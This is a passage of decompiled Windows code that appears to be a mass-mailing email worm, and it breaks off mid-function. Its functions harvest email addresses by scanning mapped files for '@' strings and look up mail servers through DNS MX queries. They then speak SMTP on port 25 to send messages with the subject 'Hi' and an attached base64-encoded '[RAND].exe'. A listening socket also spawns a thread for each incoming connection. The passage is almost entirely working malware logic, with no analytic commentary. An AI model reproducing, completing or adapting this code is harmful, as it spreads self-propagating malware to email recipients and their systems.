}

//----- (00401972) --------------------------------------------------------
bool __stdcall sub_401972(SOCKET a1, int a2)
{
  int v2; // eax
  struct timeval timeout; // [esp+0h] [ebp-10Ch] BYREF
  fd_set readfds; // [esp+8h] [ebp-104h] BYREF

  timeout.tv_sec = a2;
  timeout.tv_usec = 0;
  readfds.fd_count = 1;
  readfds.fd_array[0] = a1;
  v2 = select(0, &readfds, 0, 0, &timeout);
  return v2 != -1 && v2;
}

//----- (004019CF) --------------------------------------------------------
BOOL __stdcall sub_4019CF(SOCKET s, int a2, int a3, int a4, int a5)
{
  int v6; // eax
  int v7; // ecx
  int v8; // eax
  char buf[128]; // [esp+4h] [ebp-80h] BYREF

  LOBYTE(v6) = sub_401972(s, a4);
  if ( v6 )
  {
    do
    {
      if ( (unsigned int)a3 <= 0x80 )
        v7 = a3;
      else
        v7 = 128;
      if ( !v7 )
        break;
      v8 = recv(s, buf, v7, 0);
      if ( v8 <= 0 )
        break;
      a3 -= v8;
      (*(void (__stdcall **)(int, char *, int, _DWORD))(*(_DWORD *)a2 + 16))(a2, buf, v8, 0);
    }
    while ( !a5 );
  }
  return a3 == 0;
}
// 4019E6: variable 'v6' is possibly undefined

//----- (00401A38) --------------------------------------------------------
int __stdcall sub_401A38(SOCKET s, int a2, int a3, int a4, int a5)
{
  int v5; // ebx
  int v6; // eax
  char buf; // [esp+7h] [ebp-1h] BYREF

  v5 = 0;
  LOBYTE(v6) = sub_401972(s, a5);
  if ( v6 )
  {
    do
    {
      if ( recv(s, &buf, 1, 0) <= 0 )
        break;
      if ( buf == (_BYTE)a4 )
        LOBYTE(v5) = 1;
      (*(void (__stdcall **)(int, char *, int, _DWORD))(*(_DWORD *)a2 + 16))(a2, &buf, 1, 0);
      if ( sub_401426(a2) >= (unsigned int)a3 )
        break;
    }
    while ( !v5 );
  }
  return v5;
}
// 401A4E: variable 'v6' is possibly undefined

//----- (00401A9B) --------------------------------------------------------
int __stdcall sub_401A9B(SOCKET s, int a2, int a3, int a4)
{
  int result; // eax
  int v5; // [esp+0h] [ebp-Ch]
  char v6[3]; // [esp+7h] [ebp-5h] BYREF
  char v7; // [esp+Ah] [ebp-2h]

  while ( 1 )
  {
    sub_401481(a2);
    v5 = sub_4013F7(a2, 0, 1);
    sub_401000(v6, 5u);
    result = sub_401A38(s, a2, a3, 10, a4);
    if ( !result )
      break;
    sub_4013F7(a2, v5, 0);
    (*(void (__stdcall **)(int, char *, int, _DWORD))(*(_DWORD *)a2 + 12))(a2, v6, 4, 0);
    sub_40145B(a2);
    if ( v7 == 32 )
      return 1;
    if ( v7 != 45 )
      return 0;
  }
  return result;
}

//----- (00401B25) --------------------------------------------------------
SOCKET __stdcall sub_401B25(char *cp, int a2, int a3)
{
  SOCKET v3; // ebx
  SOCKET v4; // eax
  unsigned int v5; // eax
  struct sockaddr name; // [esp+4h] [ebp-10h] BYREF

  v3 = 0;
  v4 = socket(2, 1, 6);
  if ( v4 != -1 )
  {
    v3 = v4;
    sub_401000((char *)&name, 0x10u);
    name.sa_family = 2;
    *(_WORD *)name.sa_data = a3;
    if ( a2 )
    {
      v5 = a2;
    }
    else
    {
      if ( !cp )
        goto LABEL_7;
      v5 = sub_401939(cp);
      if ( v5 == -1 )
        goto LABEL_7;
    }
    *(_DWORD *)&name.sa_data[2] = v5;
    if ( connect(v3, &name, 16) == -1 )
    {
LABEL_7:
      closesocket(v3);
      return 0;
    }
  }
  return v3;
}

//----- (00401BA7) --------------------------------------------------------
DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
{
  SOCKET *v1; // ebx
  DWORD (__stdcall *v2)(LPVOID); // esi
  __int16 v3; // ax
  void *v4; // eax
  HANDLE v5; // eax
  DWORD ThreadId; // [esp+8h] [ebp-14h] BYREF
  struct sockaddr name; // [esp+Ch] [ebp-10h] BYREF

  sub_401000((char *)&name, 0x10u);
  name.sa_family = 2;
  v1 = (SOCKET *)*((_DWORD *)lpThreadParameter + 2);
  v2 = (DWORD (__stdcall *)(LPVOID))*((_DWORD *)lpThreadParameter + 1);
  LOBYTE(v3) = BYTE1(*(_DWORD *)lpThreadParameter);
  HIBYTE(v3) = *(_DWORD *)lpThreadParameter;
  *(_WORD *)name.sa_data = v3;
  *(_DWORD *)&name.sa_data[2] = 0;
  *v1 = socket(2, 1, 6);
  GlobalFree(lpThreadParameter);
  if ( *v1 == -1 )
  {
    *v1 = 0;
  }
  else if ( !bind(*v1, &name, 16) && !listen(*v1, 5) )
  {
    while ( 1 )
    {
      v4 = (void *)accept(*v1, &name, 0);
      if ( v4 == (void *)-1 )
        break;
      if ( (unsigned int)dword_405758 >= 5 )
      {
        closesocket((SOCKET)v4);
      }
      else
      {
        v5 = CreateThread(0, 0, v2, v4, 0, &ThreadId);
        CloseHandle(v5);
      }
    }
  }
  if ( *v1 )
  {
    closesocket(*v1);
    *v1 = 0;
  }
  return 0;
}
// 405758: using guessed type int dword_405758;

//----- (00401C78) --------------------------------------------------------
BOOL __stdcall sub_401C78(int a1, int a2, int a3)
{
  _DWORD *v3; // eax
  HANDLE v4; // eax
  DWORD ThreadId; // [esp+0h] [ebp-8h] BYREF
  LPVOID lpParameter; // [esp+4h] [ebp-4h]

  v3 = GlobalAlloc(0, 0xCu);
  lpParameter = v3;
  *v3 = a1;
  v3[1] = a2;
  v3[2] = a3;
  v4 = CreateThread(0, 0, StartAddress, lpParameter, 0, &ThreadId);
  return CloseHandle(v4);
}

//----- (00401CBC) --------------------------------------------------------
HGLOBAL sub_401CBC()
{
  ULONG pOutBufLen; // [esp+0h] [ebp-8h] BYREF
  PFIXED_INFO pFixedInfo; // [esp+4h] [ebp-4h]

  pFixedInfo = (PFIXED_INFO)GlobalAlloc(0x40u, 0x248u);
  pOutBufLen = 584;
  if ( GetNetworkParams(pFixedInfo, &pOutBufLen) == 111 )
  {
    GlobalFree(pFixedInfo);
    pFixedInfo = (PFIXED_INFO)GlobalAlloc(0x40u, pOutBufLen);
  }
  if ( !GetNetworkParams(pFixedInfo, &pOutBufLen) )
    lstrcpyA(cp, pFixedInfo->DnsServerList.IpAddress.String);
  return GlobalFree(pFixedInfo);
}

//----- (00401D2C) --------------------------------------------------------
int __stdcall sub_401D2C(int a1, LPCSTR lpString)
{
  int v2; // ecx
  LPCSTR v3; // edi
  LPCSTR v4; // edx
  bool v5; // zf
  int v6; // ebx
  int v7; // ecx
  int v9; // [esp-4h] [ebp-24h]
  int v10; // [esp+0h] [ebp-20h]
  int v11; // [esp+4h] [ebp-1Ch]
  int v12; // [esp+8h] [ebp-18h]
  __int16 v13; // [esp+Eh] [ebp-12h] BYREF
  int v14; // [esp+10h] [ebp-10h] BYREF
  __int16 v15[6]; // [esp+14h] [ebp-Ch] BYREF

  sub_401000((char *)v15, 0xCu);
  v15[0] = 514;
  v15[1] = __ROR2__(256, 8);
  v15[2] = __ROR2__(1, 8);
  (*(void (__stdcall **)(int, __int16 *, int, _DWORD))(*(_DWORD *)a1 + 16))(a1, v15, 12, 0);
  v2 = lstrlenA(lpString);
  v3 = lpString;
  do
  {
    v4 = v3;
    do
    {
      if ( !v2 )
        break;
      v5 = *v3++ == 46;
      --v2;
    }
    while ( !v5 );
    v6 = v3 - v4;
    if ( *(v3 - 1) == 46 )
      --v6;
    v14 = v6;
    (*(void (__stdcall **)(int, int *, int, _DWORD, LPCSTR, int, int, int))(*(_DWORD *)a1 + 16))(
      a1,
      &v14,
      1,
      0,
      v4,
      v2,
      v10,
      v11);
    v7 = v12;
    v12 = 0;
    v11 = v14;
    v10 = v7;
    (*(void (__cdecl **)(int))(*(_DWORD *)a1 + 16))(a1);
    v14 = 0;
    v2 = v9;
  }
  while ( v9 );
  (*(void (__stdcall **)(int, int *, int, _DWORD))(*(_DWORD *)a1 + 16))(a1, &v14, 1, 0);
  v13 = __ROR2__(15, 8);
  (*(void (__stdcall **)(int, __int16 *, int, _DWORD))(*(_DWORD *)a1 + 16))(a1, &v13, 2, 0);
  v13 = __ROR2__(1, 8);
  return (*(int (__stdcall **)(int, __int16 *, int, _DWORD))(*(_DWORD *)a1 + 16))(a1, &v13, 2, 0);
}
// 401DA3: variable 'v10' is possibly undefined
// 401DA3: variable 'v11' is possibly undefined
// 401DA6: variable 'v12' is possibly undefined
// 401DBF: variable 'v9' is possibly undefined

//----- (00401E1A) --------------------------------------------------------
CHAR *__stdcall sub_401E1A(int a1, char *cp)
{
  SOCKET v2; // eax
  SOCKET v3; // ebx
  int v4; // eax
  char v5; // t1
  int v6; // eax
  CHAR *v7; // ebx
  char v9[128]; // [esp+4h] [ebp-84h] BYREF
  char buf[4]; // [esp+84h] [ebp-4h] BYREF

  v2 = sub_401B25(cp, 0, 13568);
  if ( !v2 )
    return 0;
  v3 = v2;
  v4 = sub_401426(a1);
  v5 = v4;
  LOBYTE(v4) = BYTE1(v4);
  BYTE1(v4) = v5;
  *(_DWORD *)buf = v4;
  send(v3, buf, 2, 0);
  sub_40146E(a1);
  while ( 1 )
  {
    (*(void (__stdcall **)(int, char *, int, char *))(*(_DWORD *)a1 + 12))(a1, v9, 128, buf);
    if ( !*(_DWORD *)buf )
      break;
    send(v3, v9, *(int *)buf, 0);
  }
  sub_401481(a1);
  if ( !sub_4019CF(v3, a1, 2, 4, 0)
    || (sub_40146E(a1),
        *(_DWORD *)buf = 0,
        (*(void (__stdcall **)(int, char *, int, _DWORD))(*(_DWORD *)a1 + 12))(a1, buf, 2, 0),
        sub_401481(a1),
        HIWORD(v6) = *(_WORD *)&buf[2],
        LOBYTE(v6) = buf[1],
        BYTE1(v6) = buf[0],
        !sub_4019CF(v3, a1, v6, 4, 0)) )
  {
    closesocket(v3);
    return 0;
  }
  closesocket(v3);
  v7 = sub_401FAF(a1);
  if ( lstrlenA(v7) )
    return v7;
  GlobalFree(v7);
  return 0;
}

//----- (00401F2C) --------------------------------------------------------
int __stdcall sub_401F2C(int a1, int a2, LPCSTR lpString)
{
  int v4; // eax
  CHAR *v5; // edi
  int v6; // ecx
  CHAR v7; // al
  int v9; // [esp-4h] [ebp-Ch]

  while ( 1 )
  {
    v4 = *(unsigned __int8 *)a2++;
    if ( (v4 & 0xC0) != 0 )
      break;
    if ( !(_BYTE)v4 )
      return a2;
    v9 = v4;
    v5 = (CHAR *)&lpString[lstrlenA(lpString)];
    v6 = v9;
    do
    {
      v7 = *(_BYTE *)a2++;
      *v5++ = v7;
      --v6;
    }
    while ( v6 );
    *v5 = 46;
    v5[1] = 0;
  }
  LOBYTE(v4) = v4 & 0x3F;
  LOWORD(v4) = (_WORD)v4 << 8;
  LOBYTE(v4) = *(_BYTE *)a2;
  sub_401F2C(a1, v4 + a1, lpString);
  ++a2;
  return a2;
}

//----- (00401F81) --------------------------------------------------------
int __stdcall sub_401F81(int a1, int a2, PSTR psz)
{
  int v4; // [esp-4h] [ebp-4h]

  *psz = 0;
  v4 = sub_401F2C(a1, a2, psz);
  StrTrimA(psz, ".");
  return v4;
}

//----- (00401FAF) --------------------------------------------------------
CHAR *__stdcall sub_401FAF(int a1)
{
  CHAR *v1; // eax
  int v2; // ebx
  int v3; // ebx
  _DWORD *v4; // eax
  int v5; // esi
  int v6; // eax
  int v7; // esi
  int v8; // eax
  unsigned __int16 *v9; // esi
  char v10; // t0
  int v12; // [esp-4h] [ebp-20h]
  unsigned __int16 v13; // [esp-2h] [ebp-1Eh]
  unsigned __int16 v14; // [esp+Eh] [ebp-Eh]
  CHAR *lpString1; // [esp+10h] [ebp-Ch]
  CHAR *lpString2; // [esp+14h] [ebp-8h]
  _WORD *hMem; // [esp+18h] [ebp-4h]

  v14 = -1;
  lpString2 = (CHAR *)GlobalAlloc(0, 0x10000u);
  v1 = (CHAR *)GlobalAlloc(0, 0x10000u);
  *v1 = 0;
  lpString1 = v1;
  v2 = sub_401426(a1);
  hMem = GlobalAlloc(0, v2);
  sub_40146E(a1);
  (*(void (__stdcall **)(int, _WORD *, int, _DWORD))(*(_DWORD *)a1 + 12))(a1, hMem, v2, 0);
  hMem[3] = __ROR2__(hMem[3], 8);
  hMem[1] = __ROR2__(hMem[1], 8);
  if ( (hMem[1] & 0xF) == 0 )
  {
    v3 = (unsigned __int16)hMem[3];
    v4 = (_DWORD *)sub_401F81((int)hMem, (int)(hMem + 6), lpString2);
    v5 = (int)(v4 + 1);
    if ( *v4 == 16781056 )
    {
      for ( ; v3; --v3 )
      {
        v6 = sub_401F81((int)hMem, v5, lpString2);
        v12 = *(_DWORD *)v6;
        v7 = v6 + 8;
        v8 = *(unsigned __int16 *)(v6 + 8);
        v9 = (unsigned __int16 *)(v7 + 2);
        if ( v12 == 16781056 )
        {
          v13 = *v9;
          v5 = sub_401F81((int)hMem, (int)(v9 + 1), lpString2);
          if ( v13 < v14 )
          {
            v14 = v13;
            lstrcpyA(lpString1, lpString2);
          }
        }
        else
        {
          v10 = v8;
          LOBYTE(v8) = BYTE1(v8);
          BYTE1(v8) = v10;
          v5 = (int)v9 + v8;
        }
      }
    }
  }
  GlobalFree(hMem);
  GlobalFree(lpString2);
  return lpString1;
}

//----- (004020B1) --------------------------------------------------------
CHAR *__stdcall sub_4020B1(LPCSTR lpString)
{
  CHAR *v2; // [esp-4h] [ebp-8h]
  LPSTREAM ppstm; // [esp+0h] [ebp-4h] BYREF

  if ( !byte_405760 )
  {
    byte_405760 = 1;
    sub_401CBC();
  }
  sub_4013D2(&ppstm);
  sub_401D2C((int)ppstm, lpString);
  v2 = sub_401E1A((int)ppstm, cp);
  sub_4013E5((int)ppstm);
  return v2;
}
// 405760: using guessed type char byte_405760;

//----- (004020FB) --------------------------------------------------------
int __stdcall sub_4020FB(int a1)
{
  int result; // eax
  int v2; // [esp+0h] [ebp-8h] BYREF
  unsigned int v3; // [esp+4h] [ebp-4h] BYREF

  v2 = 0;
  sub_40146E(a1);
  (*(void (__stdcall **)(int, int *, int, unsigned int *))(*(_DWORD *)a1 + 12))(a1, &v2, 3, &v3);
  if ( v3 < 3 )
    result = 0;
  else
    result = v2;
  return result;
}

//----- (00402136) --------------------------------------------------------
HGLOBAL __stdcall sub_402136(int a1, int a2)
{
  CHAR *v2; // ebx
  int v3; // eax
  int v4; // eax
  HGLOBAL result; // eax
  int v6; // [esp-4h] [ebp-1Ch]
  CHAR *v7; // [esp-4h] [ebp-1Ch]
  CHAR String2[20]; // [esp+4h] [ebp-14h] BYREF

  v6 = sub_401426(a1);
  v2 = (CHAR *)GlobalAlloc(0x40u, v6 + 4);
  sub_40146E(a1);
  (*(void (__stdcall **)(int, CHAR *, int, _DWORD))(*(_DWORD *)a1 + 12))(a1, v2, v6, 0);
  do
  {
    sub_401481(a2);
    v3 = lstrlenA(v2);
    (*(void (__stdcall **)(int, CHAR *, int, _DWORD))(*(_DWORD *)a2 + 16))(a2, v2, v3, 0);
    sub_401000(String2, 0x14u);
    v4 = sub_4012AA(9u);
    sub_401023(String2, v4 + 3);
    v7 = sub_401063(v2, aRand, String2);
    result = GlobalFree(v2);
    v2 = v7;
  }
  while ( v7 );
  return result;
}

//----- (004021C7) --------------------------------------------------------
int __stdcall sub_4021C7(int a1, PCSTR pszStart, char *cp)
{
  int v3; // edi
  SOCKET v4; // eax
  SOCKET v5; // ebx
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int len; // [esp+Ch] [ebp-14h] BYREF
  LPSTR buf; // [esp+10h] [ebp-10h]
  LPSTREAM v14; // [esp+14h] [ebp-Ch]
  LPSTREAM ppstm; // [esp+18h] [ebp-8h] BYREF
  LPSTREAM v16; // [esp+1Ch] [ebp-4h] BYREF

  v3 = 0;
  v14 = sub_402601(pszStart, a1);
  sub_4013D2(&ppstm);
  sub_402136((int)v14, (int)ppstm);
  buf = (LPSTR)GlobalAlloc(0x40u, 0x2000u);
  sub_4013D2(&v16);
  v4 = sub_401B25(cp, 0, 6400);
  if ( v4 )
  {
    v5 = v4;
    if ( sub_401A9B(v4, (int)v16, 1024, 15) )
    {
      if ( sub_4020FB((int)v16) == 3158578 )
      {
        gethostname(buf + 2048, 1024);
        wsprintfA(buf, "HELO %s\r\n", buf + 2048);
        v6 = lstrlenA(buf);
        send(v5, buf, v6, 0);
        if ( sub_401A9B(v5, (int)v16, 1024, 15) )
        {
          if ( sub_4020FB((int)v16) == 3159346 )
          {
            v7 = lstrlenA(::buf);
            send(v5, ::buf, v7, 0);
            if ( sub_401A9B(v5, (int)v16, 1024, 15) )
            {
              if ( sub_4020FB((int)v16) == 3159346 )
              {
                wsprintfA(buf, "MAIL FROM:<%s>\r\n", pszStart);
                v8 = lstrlenA(buf);
                send(v5, buf, v8, 0);
                if ( sub_401A9B(v5, (int)v16, 1024, 15) )
                {
                  if ( sub_4020FB((int)v16) == 3159346 )
                  {
                    wsprintfA(buf, "RCPT TO:<%s>\r\n", (const char *)a1);
                    v9 = lstrlenA(buf);
                    send(v5, buf, v9, 0);
                    if ( sub_401A9B(v5, (int)v16, 1024, 15) )
                    {
                      if ( sub_4020FB((int)v16) == 3159346 )
                      {
                        v10 = lstrlenA(String);
                        send(v5, String, v10, 0);
                        if ( sub_401A9B(v5, (int)v16, 1024, 15) )
                        {
                          if ( sub_4020FB((int)v16) == 3421491 )
                          {
                            sub_40146E((int)ppstm);
                            while ( 1 )
                            {
                              ppstm->lpVtbl->Read(ppstm, buf, 1024, (ULONG *)&len);
                              if ( !len )
                                break;
                              if ( send(v5, buf, len, 0) <= 0 )
                                goto LABEL_21;
                            }
                            if ( sub_401A9B(v5, (int)v16, 1024, 15) && sub_4020FB((int)v16) == 3159346 )
                              v3 = 1;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
LABEL_21:
    closesocket(v5);
  }
  sub_4013E5((int)v16);
  GlobalFree(buf);
  sub_4013E5((int)ppstm);
  sub_4013E5((int)v14);
  return v3;
}

//----- (00402465) --------------------------------------------------------
const CHAR *__stdcall sub_402465(PCSTR a1, PCSTR pszStart)
{
  const CHAR *result; // eax
  CHAR *v3; // esi

  result = StrRChrA(pszStart, 0, 0x40u);
  if ( result )
  {
    result = sub_4020B1(result + 1);
    v3 = (CHAR *)result;
    if ( result )
    {
      sub_40280C(pszStart, a1, result);
      result = (const CHAR *)GlobalFree(v3);
    }
  }
  return result;
}

//----- (0040249F) --------------------------------------------------------
LPSTR __stdcall sub_40249F(int a1, int a2, LPCSTR lpString, int a4, int a5)
{
  CHAR **v5; // eax
  CHAR **v6; // ebx
  CHAR ***v7; // ecx
  CHAR *v8; // eax
  LPSTR result; // eax
  int v10; // [esp-4h] [ebp-10h]

  v10 = lstrlenA(lpString);
  v5 = (CHAR **)GlobalAlloc(0x40u, 0x10u);
  v6 = v5;
  v7 = (CHAR ***)a2;
  if ( *(_DWORD *)a1 )
  {
    *(_DWORD *)(*(_DWORD *)a2 + 8) = v5;
    v7 = (CHAR ***)a2;
  }
  else
  {
    *(_DWORD *)a1 = v5;
  }
  *v7 = v5;
  v8 = (CHAR *)GlobalAlloc(0x40u, v10 + 4);
  *v6 = v8;
  result = lstrcpyA(v8, lpString);
  v6[1] = (CHAR *)a4;
  v6[3] = (CHAR *)a5;
  return result;
}

//----- (004024FC) --------------------------------------------------------
LPSTR __stdcall sub_4024FC(LPSTR lpString1)
{
  int v1; // edx
  struct _TIME_ZONE_INFORMATION TimeZoneInformation; // [esp+0h] [ebp-DCh] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+ACh] [ebp-30h] BYREF
  CHAR DateStr[31]; // [esp+BDh] [ebp-1Fh] BYREF

  GetLocalTime(&SystemTime);
  GetDateFormatA(9u, 0, &SystemTime, Format, DateStr, 30);
  lstrcpyA(lpString1, DateStr);
  GetTimeFormatA(9u, 8u, &SystemTime, aHhMmSs, DateStr, 30);
  lstrcatA(lpString1, DateStr);
  GetTimeZoneInformation(&TimeZoneInformation);
  v1 = -TimeZoneInformation.Bias % 60;
  if ( v1 < 0 )
    v1 = -v1;
  wsprintfA(DateStr, "%03i%02i", -TimeZoneInformation.Bias / 60, v1);
  if ( DateStr[0] == 48 )
    DateStr[0] = 43;
  return lstrcatA(lpString1, DateStr);
}

//----- (004025A5) --------------------------------------------------------
const char *__stdcall sub_4025A5(int a1, PCSTR pszStart, int a3, LPSTR a4)
{
  const char *result; // eax
  CHAR String1[50]; // [esp+0h] [ebp-50h] BYREF
  char v6[30]; // [esp+32h] [ebp-1Eh] BYREF

  sub_401000(v6, 0x14u);
  sub_401023(v6, 19);
  sub_4024FC(String1);
  result = StrRChrA(pszStart, 0, 0x40u);
  if ( result )
    result = (const char *)wsprintfA(
                             a4,
                             "Date: %s\r\n"
                             "To: %s\r\n"
                             "Subject: Hi\r\n"
                             "From: %s\r\n"
                             "Message-ID: <%s%s>\r\n"
                             "MIME-Version: 1.0\r\n"
                             "Content-Type: multipart/mixed;\r\n"
                             "        boundary=\"--------%s\"\r\n"
                             "\r\n",
                             String1,
                             (const char *)a1,
                             pszStart,
                             v6,
                             result,
                             (const char *)a3);
  return result;
}

//----- (00402601) --------------------------------------------------------
LPSTREAM __stdcall sub_402601(PCSTR pszStart, int a2)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v5; // eax
  CHAR *lpString; // [esp+0h] [ebp-28h]
  char v8[30]; // [esp+6h] [ebp-22h] BYREF
  LPSTREAM ppstm; // [esp+24h] [ebp-4h] BYREF

  sub_4013D2(&ppstm);
  lpString = (CHAR *)GlobalAlloc(0x40u, 0x800u);
  sub_401000(v8, 0x1Eu);
  sub_401043(v8, 15);
  sub_4025A5(a2, pszStart, (int)v8, lpString);
  v2 = lstrlenA(lpString);
  ppstm->lpVtbl->Write(ppstm, lpString, v2, 0);
  wsprintfA(
    lpString,
    "----------%s\r\nContent-Type: text/plain; charset=\"us-ascii\"\r\nContent-Transfer-Encoding: 7bit\r\n\r\n",
    v8);
  v3 = lstrlenA(lpString);
  ppstm->lpVtbl->Write(ppstm, lpString, v3, 0);
  ppstm->lpVtbl->Write(ppstm, &unk_405667, 44, 0);
  ppstm->lpVtbl->Write(ppstm, asc_4057E3, 2, 0);
  wsprintfA(
    lpString,
    "----------%s\r\n"
    "Content-Type: application/x-msdownload; name=\"[%%RAND%%].exe\"\r\n"
    "Content-Transfer-Encoding: base64\r\n"
    "Content-Disposition: attachment; filename=\"[%%RAND%%].exe\"\r\n"
    "\r\n",
    v8);
  v4 = lstrlenA(lpString);
  ppstm->lpVtbl->Write(ppstm, lpString, v4, 0);
  ppstm->lpVtbl->Write(ppstm, ::lpString, dword_407F18, 0);
  wsprintfA(lpString, "\r\n\r\n----------%s--\r\n\r\n.\r\n", v8);
  v5 = lstrlenA(lpString);
  ppstm->lpVtbl->Write(ppstm, lpString, v5, 0);
  GlobalFree(lpString);
  return ppstm;
}
// 407F18: using guessed type int dword_407F18;

//----- (00402737) --------------------------------------------------------
HGLOBAL sub_402737()
{
  int v0; // ebx
  _DWORD *v1; // edi
  HGLOBAL result; // eax

  hMutex = CreateMutexA(0, 0, 0);
  dword_40812A = 0;
  dword_40812E = 0;
  v0 = 5;
  v1 = dword_408132;
  do
  {
    result = GlobalAlloc(0x40u, 0xCu);
    *v1++ = result;
    --v0;
  }
  while ( v0 );
  return result;
}
// 40812A: using guessed type int dword_40812A;
// 40812E: using guessed type int dword_40812E;

//----- (00402778) --------------------------------------------------------
DWORD __stdcall sub_402778(LPVOID lpThreadParameter)
{
  void *v1; // ecx
  int v2; // edi
  bool v3; // cc
  char *v5; // [esp+8h] [ebp-Ch]
  CHAR *v6; // [esp+Ch] [ebp-8h]
  HGLOBAL hMem; // [esp+10h] [ebp-4h]

  do
  {
    WaitForSingleObject(hMutex, 0xFFFFFFFF);
    v1 = (void *)*((_DWORD *)lpThreadParameter + 1);
    if ( v1 )
    {
      hMem = *(HGLOBAL *)v1;
      v6 = (CHAR *)*((_DWORD *)v1 + 1);
      v5 = (char *)*((_DWORD *)v1 + 3);
      *((_DWORD *)lpThreadParameter + 1) = *((_DWORD *)v1 + 2);
      GlobalFree(v1);
      ReleaseMutex(hMutex);
      v2 = 3;
      do
      {
        if ( sub_4021C7((int)hMem, v6, v5) )
          break;
        v3 = v2-- <= 1;
      }
      while ( !v3 );
      GlobalFree(hMem);
      LocalFree(v6);
      LocalFree(v5);
    }
    else
    {
      ReleaseMutex(hMutex);
    }
    v3 = (*(_DWORD *)lpThreadParameter)-- <= 1;
  }
  while ( !v3 );
  return 0;
}

//----- (0040280C) --------------------------------------------------------
BOOL __stdcall sub_40280C(LPCSTR lpString, PCSTR a2, PCSTR pszSrch)
{
  _DWORD *v3; // ebx
  PSTR v4; // eax
  HANDLE v5; // eax
  PSTR v7; // [esp-4h] [ebp-Ch]
  DWORD ThreadId; // [esp+4h] [ebp-4h] BYREF

  WaitForSingleObject(hMutex, 0xFFFFFFFF);
  if ( (unsigned int)dword_40812A >= 5 )
    dword_40812A = 0;
  v3 = (_DWORD *)dword_408132[dword_40812A];
  v7 = StrDupA(pszSrch);
  v4 = StrDupA(a2);
  sub_40249F((int)(v3 + 1), (int)(v3 + 2), lpString, (int)v4, (int)v7);
  ++dword_40812A;
  if ( !*v3 )
  {
    v5 = CreateThread(0, 0, sub_402778, v3, 0, &ThreadId);
    CloseHandle(v5);
  }
  ++*v3;
  return ReleaseMutex(hMutex);
}
// 40812A: using guessed type int dword_40812A;

//----- (004028A5) --------------------------------------------------------
_BYTE *__userpurge sub_4028A5@<eax>(_BYTE *a1@<esi>, unsigned int a2)
{
  _BYTE *v2; // ebx
  char *v3; // esi
  char i; // cl
  char v5; // al

  v2 = a1;
  v3 = a1 - 2;
  for ( i = 1; (unsigned int)v3 >= a2; i = v5 )
  {
    v5 = *v3++;
    if ( ((unsigned __int8)v5 < 0x30u || (unsigned __int8)v5 > 0x39u)
      && ((unsigned __int8)v5 < 0x41u || (unsigned __int8)v5 > 0x5Au)
      && ((unsigned __int8)v5 < 0x61u || (unsigned __int8)v5 > 0x7Au)
      && v5 != 46
      && v5 != 95
      && v5 != 45
      && (v5 || !i) )
    {
      break;
    }
    v2 = v3 + 1;
  }
  return v2;
}

//----- (004028F3) --------------------------------------------------------
char *__userpurge sub_4028F3@<eax>(char *a1@<esi>, unsigned int a2)
{
  char *v2; // ebx
  char i; // cl
  char v4; // al

  v2 = a1;
  for ( i = 1; (unsigned int)a1 < a2; i = v4 )
  {
    v4 = *a1++;
    if ( ((unsigned __int8)v4 < 0x30u || (unsigned __int8)v4 > 0x39u)
      && ((unsigned __int8)v4 < 0x41u || (unsigned __int8)v4 > 0x5Au)
      && ((unsigned __int8)v4 < 0x61u || (unsigned __int8)v4 > 0x7Au)
      && v4 != 46
      && v4 != 95
      && v4 != 45
      && (v4 || !i) )
    {
      break;
    }
    v2 = a1;
  }
  return v2;
}

//----- (0040293D) --------------------------------------------------------
BOOL __stdcall sub_40293D(int a1, int a2)
{
  return a2 - a1 >= 2;
}

//----- (0040295A) --------------------------------------------------------
const CHAR *__stdcall sub_40295A(PCSTR pszStart, int a2)
{
  const CHAR *result; // eax

  result = StrRChrA(pszStart, 0, 0x2Eu);
  if ( result )
    result = (const CHAR *)((unsigned int)lstrlenA(result) > 2);
  return result;
}

//----- (00402985) --------------------------------------------------------
void __stdcall sub_402985(unsigned int a1, int a2, void (__stdcall *a3)(CHAR *))
{
  char *v3; // esi
  char v4; // al
  CHAR *v5; // ebx
  char *v6; // ecx
  CHAR *v7; // esi
  CHAR *v8; // edi
  CHAR *v9; // edx
  CHAR v10; // al
  int v11; // edi
  BOOL v12; // ebx
  PCSTR v13; // edx
  int v14; // [esp-8h] [ebp-214h]
  char *v15; // [esp-4h] [ebp-210h]
  CHAR String[500]; // [esp+Ch] [ebp-200h] BYREF
  int v17; // [esp+200h] [ebp-Ch]
  unsigned int v18; // [esp+204h] [ebp-8h]
  unsigned int v19; // [esp+208h] [ebp-4h]

  v17 = 0;
  v3 = (char *)a1;
  v19 = a1;
  v18 = a1 + a2;
  while ( (unsigned int)v3 < v18 )
  {
    if ( ++v17 == 10000 )
    {
      Sleep(1u);
      v17 = 0;
    }
    v4 = *v3++;
    if ( v4 == 64 )
    {
      v15 = v3;
      v5 = sub_4028A5(v3, v19);
      v6 = (char *)(sub_4028F3(v3, v18) - v5);
      if ( (unsigned int)v6 < 0x1F4 && (unsigned int)v6 > 5 )
      {
        v7 = v5;
        v8 = String;
        v9 = 0;
        do
        {
          v10 = *v7++;
          if ( v10 )
          {
            *v8++ = v10;
            if ( v10 == 64 )
              v9 = v8;
          }
          --v6;
        }
        while ( v6 );
        *v8 = 0;
        v11 = (int)(v8 + 1);
        if ( v9 )
        {
          v14 = (int)v9;
          if ( (unsigned int)lstrlenA(String) > 5 )
          {
            v12 = sub_40293D((int)String, v14);
            if ( ((unsigned int)sub_40295A(v13, v11) & v12) != 0 )
              a3(String);
          }
        }
      }
      v3 = v15;
    }
  }
}
// 402A38: variable 'v13' is possibly undefined

//----- (00402A5A) --------------------------------------------------------
int __stdcall sub_402A5A(LPCSTR lpFileName, int a2)
{
  int result; // eax
  HANDLE v3; // eax
  void *v4; // ebx
  const void *v5; // eax
  const void *v6; // [esp-4h] [ebp-10h]
  int v7; // [esp+4h] [ebp-8h]
  HANDLE hFile; // [esp+8h] [ebp-4h]

  hFile = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0, 0);
  result = (int)hFile + 1;
  if ( hFile != (HANDLE)-1 )
  {
    v7 = GetFileSize(hFile, 0);
    if ( v7 != -1 )
    {
      v3 = CreateFileMappingA(hFile, 0, 2u, 0, 0, 0);
      if ( v3 )
      {
        v4 = v3;
        v5 = MapViewOfFile(v3, 4u, 0, 0, 0);
        if ( v5 )
        {
          v6 = v5;
          sub_402985((unsigned int)v5, v7, (void (__stdcall *)(CHAR *))a2);
